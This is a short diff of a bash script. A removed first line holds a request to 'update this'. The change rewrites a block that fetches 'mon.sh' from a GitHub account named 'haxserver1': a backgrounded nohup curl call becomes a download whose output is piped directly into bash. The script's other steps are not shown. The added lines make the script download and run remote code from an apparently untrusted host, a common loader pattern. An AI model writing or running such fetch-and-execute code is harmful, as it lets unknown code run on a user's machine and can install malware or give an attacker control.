@@ -1,5 +1,3 @@
-can you update this 
-
 #!/bin/bash
 
 # Check if an argument is provided
@@ -71,11 +69,14 @@ chmod +x *
 
 # Execute additional script
 echo "Downloading and executing additional script..."
-if nohup curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh") > /dev/null 2>&1 & then
-    echo "Script download initiated. Executing in the background..."
+if curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh"); then
+    echo "Script downloaded successfully. Executing..."
+    echo "$curl_output" | bash
+    echo "Additional script executed successfully."
 else
-    echo "Failed to initiate download or execute additional script using curl with nohup."
-    # Use another method here if needed
+    echo "Failed to download or execute additional script."
+    exit 1
 fi
+
 
 echo "Script executed successfully."
